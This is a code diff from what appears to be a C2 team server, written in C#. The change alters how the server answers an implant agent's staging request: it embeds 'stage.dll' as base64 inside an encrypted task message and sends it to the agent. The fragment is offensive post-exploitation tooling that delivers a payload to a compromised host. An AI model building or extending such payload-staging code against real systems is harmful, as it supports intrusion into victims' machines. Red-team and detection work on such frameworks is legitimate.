@@ -61,20 +61,36 @@ namespace TeamServer.ServerModules
         {
             var stage = Helpers.GetEmbeddedResource("stage.dll");
 
-            var c2Data = Agent.Crypto.Encrypt(new C2Data
+            var c2Data = Agent.Crypto.Encrypt(
+                new AgentTask
+                {
+                    Module = "Core",
+                    Command = "StageResponse",
+                    Parameters = new Dictionary<string, object>
+                    { 
+                        { "Stage", Convert.ToBase64String(stage) }
+                    }
+                },
+                out byte[] iv);
+            
+            if (C2Data.Data == null)
             {
-                Module = "Core",
-                Command = "StageResponse",
-                Data = stage
-            },
-            out byte[] iv);
-
-            Agent.SendAgentMessage(new AgentMessage
+                Agent.SendAgentMessage(new AgentMessage
+                {
+                    AgentID = AgentID,
+                    Data = c2Data,
+                    IV = iv
+                });
+            }
+            else
             {
-                AgentID = AgentID,
-                Data = c2Data,
-                IV = iv
-            });
+                Agent.SendAgentMessage(new AgentMessage
+                {
+                    AgentID = AgentID,
+                    Data = c2Data,
+                    IV = iv
+                }, Encoding.UTF8.GetString(C2Data.Data));
+            }
         }
 
         void HandleInitialCheckin(string AgentID, C2Data C2Data)
